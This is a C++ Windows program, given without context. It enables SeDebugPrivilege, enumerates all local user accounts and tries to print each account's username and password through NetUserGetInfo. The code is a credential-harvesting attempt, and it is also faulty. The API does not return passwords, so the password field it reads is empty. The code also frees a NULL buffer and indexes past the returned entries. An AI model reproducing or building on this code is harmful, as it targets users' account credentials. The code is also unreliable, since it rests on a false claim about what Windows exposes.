#include <iostream>
#include <string>
#include <Windows.h>
#include <LM.h>

#pragma comment(lib, "netapi32.lib")

int wmain()
{
    DWORD dwError;
    HANDLE hToken;
    LUID SeDebugPrivilege;
    TOKEN_PRIVILEGES TokenPrivileges;
    ZeroMemory(&TokenPrivileges, sizeof(TOKEN_PRIVILEGES));
    TOKEN_USER* pTokenUser = NULL;
    DWORD dwTokenUserSize = 0;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        std::cerr << "OpenProcessToken failed with error " << GetLastError() << std::endl;
        return 1;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &SeDebugPrivilege))
    {
        std::cerr << "LookupPrivilegeValue failed with error " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return 1;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Luid = SeDebugPrivilege;
    TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        std::cerr << "AdjustTokenPrivileges failed with error " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return 1;
    }

    dwError = GetLastError();

    if (dwError == ERROR_SUCCESS)
    {
        std::cout << "SeDebugPrivilege enabled successfully." << std::endl;
    }
    else
    {
        std::cerr << "Failed to enable SeDebugPrivilege." << std::endl;
        CloseHandle(hToken);
        return 1;
    }

    NetApiBufferFree(pTokenUser);
    CloseHandle(hToken);

    DWORD dwRead, dwTotal, dwResumeHandle;
    USER_INFO_1* pBuffer = NULL;
    DWORD nStatus = NetUserEnum(NULL, 1, FILTER_NORMAL_ACCOUNT, (LPBYTE*)&pBuffer, MAX_PREFERRED_LENGTH, &dwRead, &dwTotal, &dwResumeHandle);

    if (nStatus != NERR_Success)
    {
        std::cerr << "NetUserEnum failed with error " << nStatus << std::endl;
        return 1;
    }

    for (int i = 0; i < dwTotal; i++)
    {
        USER_INFO_3* pUserInfo3 = NULL;
        nStatus = NetUserGetInfo(NULL, pBuffer[i].usri1_name, 3, (LPBYTE*)&pUserInfo3);

        if (nStatus == NERR_Success)
        {
            std::wstring username(pBuffer[i].usri1_name);
            std::wstring password(pUserInfo3->usri3_password);

            std::wcout << L"Username: " << username << std::endl;
            std::wcout << L"Password: " << password << std::endl;

            NetApiBufferFree(pUserInfo3);
        }
        else
        {
            std::cerr << "NetUserGetInfo failed with error " << nStatus << std::endl;
        }
    }

    NetApiBufferFree(pBuffer);

    return 0;
}
